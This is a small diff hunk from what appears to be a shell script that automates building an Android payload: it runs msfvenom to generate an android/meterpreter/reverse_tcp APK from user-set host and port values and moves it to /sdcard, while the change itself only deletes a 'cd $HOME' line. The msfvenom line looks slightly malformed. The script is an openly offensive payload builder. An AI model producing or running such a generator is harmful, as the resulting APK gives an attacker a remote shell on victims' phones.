@@ -23,7 +23,6 @@ printf "\e[1;94m.\e[0m\n"
 sleep 0.3
 printf "\n"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt R>${pld}.apk /sdcard
-cd $HOME
 mv -v ${pld}.apk /sdcard
 sleep 0.5
 printf "\n"
